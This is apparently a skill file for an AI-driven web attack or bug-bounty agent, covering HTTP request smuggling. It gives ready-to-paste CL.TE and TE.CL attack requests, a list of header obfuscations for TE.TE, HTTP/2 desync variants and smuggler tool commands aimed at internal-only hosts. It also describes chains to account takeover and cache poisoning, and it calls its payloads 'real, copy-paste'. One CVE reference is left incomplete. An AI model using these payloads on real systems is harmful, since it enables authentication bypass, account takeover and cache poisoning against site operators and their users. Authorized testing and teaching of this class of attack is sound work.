# SKILL: HTTP Request Smuggling (CL.TE / TE.CL / TE.TE / H2.CL / H2.TE / H2.0)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (http request smuggling (cl.te / te.cl / te.te / h2.cl / h2.te / h2.0)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Front-end + back-end disagree on where a request ends → smuggle a second request that bypasses front-end controls (auth, WAF) and hits back-end with elevated privilege.

---

## DETECTION
Smuggler.py / Burp HTTP Request Smuggler. Differential timing — TE.CL injects pause, CL.TE injects timeout.

## EXPLOITATION
### CL.TE
```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (obfuscate the TE header so one server ignores it)
```
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: ,chunked
Transfer-Encoding: x,chunked
```

### H2.CL — desync from HTTP/2 to HTTP/1 backend (CVE-2022-...)
HTTP/2 request with smuggled CL on body; backend HTTP/1.1 reparses.

### H2.TE
HTTP/2 + injected TE header.

### H2.0 — request line injection in HTTP/2 pseudo-header
```
:method GET\r\n\r\nSMUGGLED:method POST...
```

## PAYLOADS (real, copy-paste, grouped)
(see exploitation)

## BYPASS TECHNIQUES
(see exploitation — TE.TE obfuscation list)

## CHAIN POTENTIAL
Smuggling → bypass authentication → ATO; smuggling → cache poisoning → mass XSS; smuggling → web cache deception.

## TOOLS
smuggler.py (Defparam), Burp HTTP Request Smuggler (PortSwigger), h2cSmuggler

## COMMANDS
```bash
python3 smuggler.py -u https://target -m GET
# h2c smuggling
python3 h2cSmuggler.py -x http://target -u http://internal-only/
```

## EDGE CASES / NOT-A-BUG TRAPS
Modern Cloudflare + nginx have hardened; AWS ALB + custom origin still vulnerable. HTTP/2 routing is the new frontier.

## TRIAGE ANGLE (per platform)
Show the second-request response showing privileged data.

## SEVERITY & CVSS
9.0+.

## REFERENCES
PortSwigger Request Smuggling research • Defparam/smuggler
